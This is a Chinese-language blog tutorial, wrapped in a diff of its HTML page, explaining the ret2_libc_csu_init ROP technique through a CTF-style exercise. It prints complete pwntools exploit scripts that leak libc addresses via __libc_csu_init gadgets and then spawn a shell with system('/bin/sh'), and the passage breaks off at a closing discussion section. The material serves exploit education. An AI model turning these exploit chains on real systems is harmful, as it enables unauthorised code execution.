@@ -1,0 +1,377 @@
+<!DOCTYPE html><html lang="[&quot;zh-CN&quot;,&quot;en&quot;,&quot;default&quot;]" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>中级ROP-ret2_libc_csu_init | Mandarava23</title><meta name="author" content="Mandarava23"><meta name="copyright" content="Mandarava23"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="首先，我们需要了解一下64位文件的传参方式：  当参数少于7个时，参数从左到右放入寄存器：rdi,rsi,rdx,rcx,r8,r9 当参数为7个及以上时，前6个还是上面的寄存器，但多于6位的参数从右到左依次入栈，同32位  12345H(a, b, c, d, e, f, g, h)a -&gt; %rdi, b -&gt; %rsi, c -&gt; %rdx, d -&gt; %rcx, e">
+<meta property="og:type" content="article">
+<meta property="og:title" content="中级ROP-ret2_libc_csu_init">
+<meta property="og:url" content="https://mandarava23-code.github.io/2026/09/08/PWN/PWN%E5%85%A5%E9%97%A8/%E4%B8%AD%E7%BA%A7ROP-ret2_libc_csu_init/index.html">
+<meta property="og:site_name" content="Mandarava23">
+<meta property="og:description" content="首先，我们需要了解一下64位文件的传参方式：  当参数少于7个时，参数从左到右放入寄存器：rdi,rsi,rdx,rcx,r8,r9 当参数为7个及以上时，前6个还是上面的寄存器，但多于6位的参数从右到左依次入栈，同32位  12345H(a, b, c, d, e, f, g, h)a -&gt; %rdi, b -&gt; %rsi, c -&gt; %rdx, d -&gt; %rcx, e">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://mandarava23-code.github.io/uploads/profile%20photo.png">
+<meta property="article:published_time" content="2026-09-07T17:52:46.000Z">
+<meta property="article:modified_time" content="2026-09-10T19:59:45.183Z">
+<meta property="article:author" content="Mandarava23">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mandarava23-code.github.io/uploads/profile%20photo.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "中级ROP-ret2_libc_csu_init",
+  "url": "https://mandarava23-code.github.io/2026/09/08/PWN/PWN%E5%85%A5%E9%97%A8/%E4%B8%AD%E7%BA%A7ROP-ret2_libc_csu_init/",
+  "image": "https://mandarava23-code.github.io/uploads/profile%20photo.png",
+  "datePublished": "2026-09-07T17:52:46.000Z",
+  "dateModified": "2026-09-10T19:59:45.183Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Mandarava23",
+      "url": "https://mandarava23-code.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon32.png"><link rel="canonical" href="https://mandarava23-code.github.io/2026/09/08/PWN/PWN%E5%85%A5%E9%97%A8/%E4%B8%AD%E7%BA%A7ROP-ret2_libc_csu_init/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.clarity.ms"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><meta/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>(function(c,l,a,r,i,t,y){
+    c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+    t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+    y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+})(window, document, "clarity", "script", "ub0o80q0hc");
+</script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'medium_zoom',
+  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-left"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '中级ROP-ret2_libc_csu_init',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      if ($loadingBox.classList.contains('loaded')) return
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+
+  if (document.readyState === 'complete') {
+    preloader.endLoading()
+  } else {
+    window.addEventListener('load', preloader.endLoading)
+    document.addEventListener('DOMContentLoaded', preloader.endLoading)
+    // Add timeout protection: force end after 7 seconds
+    setTimeout(preloader.endLoading, 7000)
+  }
+
+  if (true) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div id="web_bg" style="background-image: url(/uploads/%E7%8F%82%E6%9C%B5%E8%8E%89_background.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/uploads/profile%20photo.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/caidan/"><i class="fa-fw fas fa-code"></i><span> 彩蛋</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/message-board/"><i class="fa-fw fas fa-fw fas fa-comment-dots"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/uploads/%E6%B5%B7%E8%BE%B9%E5%88%9D%E9%9F%B3_background.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/uploads/profile%20photo.png" alt="Logo"><span class="site-name">Mandarava23</span></a><a class="nav-page-title" href="/"><span class="site-name">中级ROP-ret2_libc_csu_init</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/caidan/"><i class="fa-fw fas fa-code"></i><span> 彩蛋</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/message-board/"><i class="fa-fw fas fa-fw fas fa-comment-dots"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">中级ROP-ret2_libc_csu_init</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-09-07T17:52:46.000Z" title="发表于 2026-09-08 01:52:46">2026-09-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-09-10T19:59:45.183Z" title="更新于 2026-09-11 03:59:45">2026-09-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">2.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span><span class="post-meta-separator">|</span><span id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span class="waline-pageview-count" data-path="/2026/09/08/PWN/PWN%E5%85%A5%E9%97%A8/%E4%B8%AD%E7%BA%A7ROP-ret2_libc_csu_init/"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2026/09/08/PWN/PWN%E5%85%A5%E9%97%A8/%E4%B8%AD%E7%BA%A7ROP-ret2_libc_csu_init/#post-comment"><span class="waline-comment-count" data-path="/2026/09/08/PWN/PWN%E5%85%A5%E9%97%A8/%E4%B8%AD%E7%BA%A7ROP-ret2_libc_csu_init/"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>首先，我们需要了解一下64位文件的传参方式：</p>
+<ul>
+<li>当参数少于7个时，参数从左到右放入寄存器：rdi,rsi,rdx,rcx,r8,r9</li>
+<li>当参数为7个及以上时，前6个还是上面的寄存器，但多于6位的参数从右到左依次入栈，同32位</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">H(a, b, c, d, e, f, g, h)</span><br><span class="line">a -&gt; %rdi, b -&gt; %rsi, c -&gt; %rdx, d -&gt; %rcx, e -&gt; %r8, f -&gt; %r9</span><br><span class="line">h -&gt; [esp]</span><br><span class="line">g -&gt; [esp]</span><br><span class="line">call H</span><br></pre></td></tr></table></figure>
+
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在64位程序中，函数的前6个参数是通过寄存器传递的，但是在大多数时候，我们很难找到每一个寄存器对应的gadgets。这时候，我们可以利用x64下的_libc_csu_init中的gadgets。<mark style="background: #FF5582A6;">这个函数是用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在</mark><br>我们来分析一下这个函数：  </p>
+<img src="/2026/09/08/PWN/PWN%E5%85%A5%E9%97%A8/%E4%B8%AD%E7%BA%A7ROP-ret2_libc_csu_init/code1.png" class="">  
+<p>可以发现从0x40061A一直到函数的结尾，我们都可以使用栈溢出构造栈上数据来控制rbx,rbp,r12,r13,r14,r15寄存器中的数据，也就是以下汇编代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040061A 030 5B                            pop     rbx</span><br><span class="line">.text:000000000040061B 028 5D                            pop     rbp</span><br><span class="line">.text:000000000040061C 020 41 5C                         pop     r12</span><br><span class="line">.text:000000000040061E 018 41 5D                         pop     r13</span><br><span class="line">.text:0000000000400620 010 41 5E                         pop     r14</span><br><span class="line">.text:0000000000400622 008 41 5F                         pop     r15</span><br><span class="line">.text:0000000000400624 000 C3                            retn</span><br><span class="line">.text:0000000000400624                                   ; &#125; // starts at 4005C0</span><br><span class="line">.text:0000000000400624</span><br><span class="line">.text:0000000000400624                                   __libc_csu_init endp</span><br></pre></td></tr></table></figure>
+<p>地址0x400600到0x400609，这里r13赋给rdx，r14赋给rsi，r15d赋给edi（因为是r15d，所以仅能控制rdi的低32位），而这三个寄存器，正是x64函数调用中传递的前三个寄存器（edi,rsi,rdx）。若我们可以合理控制r12与rbx，那么我们就可以调用我们想要调用的函数。汇编如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400600                                   loc_400600:                            ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000400600 038 4C 89 EA                      mov     rdx, r13</span><br><span class="line">.text:0000000000400603 038 4C 89 F6                      mov     rsi, r14</span><br><span class="line">.text:0000000000400606 038 44 89 FF                      mov     edi, r15d</span><br><span class="line">.text:0000000000400609 038 41 FF 14 DC                   call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]</span><br></pre></td></tr></table></figure>
+<p>地址0x40060D到0x400614，我们可以通过控制rbx与rbp之间关系为rbx + 1 &#x3D; rbp，使得cmp的值为0，从而不出发jnz跳转，不执行loc_400600，进而执行下面的汇编程序，汇编如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040060D 038 48 83 C3 01                   add     rbx, 1</span><br><span class="line">.text:0000000000400611 038 48 39 EB                      cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614 038 75 EA                         jnz     short loc_400600</span><br></pre></td></tr></table></figure>
+
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>查看文件基本信息和保护信息  </p>
+<img src="/2026/09/08/PWN/PWN%E5%85%A5%E9%97%A8/%E4%B8%AD%E7%BA%A7ROP-ret2_libc_csu_init/PixPin_2026-09-08_02-47-33.png" class="">  
+<p>ida静态分析，main函数中的vulnerable_function函数内存在read栈溢出，溢出字节数为136  </p>
+<img src="/2026/09/08/PWN/PWN%E5%85%A5%E9%97%A8/%E4%B8%AD%E7%BA%A7ROP-ret2_libc_csu_init/PixPin_2026-09-08_02-56-25.png" class="">  
+<p>可以发现，这个程序中并没有system函数，也没有&#x2F;bin&#x2F;sh字符串，但是有一个已知的write函数，我们便可以利用这个函数泄露libc的基地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">136</span> + p64(pop_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(mov_addr) + <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x8</span> + <span class="number">8</span> * <span class="number">6</span>) +p64(main_addr)</span><br></pre></td></tr></table></figure>
+<p>分析payload构造：<br>首先填充136字节发生栈溢出，接着用pop_addr覆盖返回地址，使程序从0x40061A继续执行。即接下来会将我们payload中的<mark style="background: #FF5582A6;">0、1、write_got、8、write_got、1这六个值依次pop到rbx、rbp、r12、r13、r14、r15</mark>寄存器中，为什么是这六个值后面再分析。接着ret接收payload接下来的mov_addr，跳转到0x400600继续执行。这里程序会将r13赋给rdx(8)、r14赋给rsi(write_got)、r15d赋给edi(1)，接下来<mark style="background: #FF5582A6;">执行call调用，也就是说这里的三个赋值实际上是为接下来的call调用传参</mark>，call调用的函数地址为r12 + rbx * 8，由于我们上面pop寄存器的控制，call调用就是write函数（payload中只使用write_got而不用PLT表的原因是write函数在我们进行栈溢出之前就已经调用了，因此真实地址已经写入了GOT表中），而write函数接收上面三个参数，实际调用化为c语言便是<code>write(1, write_got, 8)</code>，即为<mark style="background: #FF5582A6;">向stdout输出地址为write_got的8个字节</mark>（write函数的真实地址），如此我们便做到了泄露write函数的真实地址。接下去便是<mark style="background: #FF5582A6;">回到main函数中以便我们第二次进行栈溢出，进行后续的ret2libc攻击</mark>。回到cpu执行，我们在执行了call调用后，先对rbx + 1，接着rbx与rbp比较，由于我们的控制，这里0 + 1 &#x3D; 1，所以jnz不满足条件继续执行后续代码，也就是loc_400616。我们接下来的目的就只有回到main函数了，所以我们<mark style="background: #FF5582A6;">直接填充(0x8 + 8 * 6)字节，0x8是为了抵消<code>add esp, 8</code>，而8 * 6则是抵消6个pop，然后ret接收payload接下来的main_addr</mark>，将cpu跳转回main函数，以便我们继续进行ret2libc攻击</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)  </span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">pop_addr = <span class="number">0x40061A</span></span><br><span class="line">mov_addr = <span class="number">0x400600</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">136</span> + p64(pop_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(mov_addr) + <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x8</span> + <span class="number">8</span> * <span class="number">6</span>) +p64(main_addr)  </span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line">io.sendline(payload)  </span><br><span class="line"></span><br><span class="line">write_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;write_addr = &#x27;</span>, <span class="built_in">hex</span>(write_addr))</span><br></pre></td></tr></table></figure>
+<p>如此，我们便得到了write函数的真实地址</p>
+<blockquote>
+<p>[!info]<br>程序加载时会寻找同目录下的libc.so.6文件，如果存在，则会自动加载，而不会去加载系统自带的libc文件</p>
+</blockquote>
+<p>通过题目所给出的libc.so.6文件可以计算出libc加载基址，从而可以算出system函数和&#x2F;bin&#x2F;sh的真实地址。<mark style="background: #FF5582A6;">由于我们现在是本地攻击的，因此用libc用的是系统的libc文件</mark>。接下来我们要做的就是利用main函数栈溢出执行system(‘&#x2F;bin&#x2F;sh’)这个指令，而我们知道<mark style="background: #FF5582A6;">64位程序中system调用时，参数取的是rdi中的值</mark>，因此我们需要先将&#x2F;bin&#x2F;sh字符串pop给rdi才行，我们这里利用ROPgadget直接查</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ./pwn | grep <span class="string">&quot;pop rdi ; ret&quot;</span></span><br><span class="line"><span class="number">0x0000000000400623</span> : pop rdi ; ret</span><br></pre></td></tr></table></figure>
+<p>通过payload链中pop rdi后紧跟&#x2F;bin&#x2F;sh，将&#x2F;bin&#x2F;sh字符串pop给rdi，并且通过ret接着执行其他命令，我们这个时候再调用system函数即可，结果即为<code>system(&#39;/bin/sh&#39;)</code>，完整exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)  </span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;) 打远程用这个</span></span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">pop_addr = <span class="number">0x40061A</span></span><br><span class="line">mov_addr = <span class="number">0x400600</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">136</span> + p64(pop_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(mov_addr) + <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x8</span> + <span class="number">8</span> * <span class="number">6</span>) +p64(main_addr)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;write_addr = &#x27;</span>, <span class="built_in">hex</span>(write_addr)) </span><br><span class="line"></span><br><span class="line">libc_base_addr = write_addr - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = libc_base_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base_addr = &#x27;</span>, <span class="built_in">hex</span>(libc_base_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system_addr = &#x27;</span>, <span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh_addr = &#x27;</span>, <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400623</span></span><br><span class="line">ret_addr = <span class="number">0x400419</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">136</span> + p64(ret_addr) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>可以看到我这里加了一个ret做了一个对齐，具体原因就是<mark style="background: #FF5582A6;">在高版本Ubuntu中，system函数内部有movaps指令，要求调用时rsp % 16 &#x3D;&#x3D; 0，强制我们16字节对齐</mark>，而我们的payload中136字节刚好是8的倍数，接着pop_rdi_ret又是8字节后进入了system函数，这时不再16字节对齐了，所以导致报错中断，因此我们这里通过<mark style="background: #FF5582A6;">添加一个ret补齐8字节的方式，使system函数调用前满足16字节对齐的条件</mark></p>
+<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>但是还有一个问题，就是我们通过ROPgadget获取到的这个0x400623地址的<code>pop rdi ; ret</code>在IDA中并没有显示啊，这是为什么呢？<br>我们不妨来看看_libc_csu_init这个函数末尾的pop处的机器码</p>
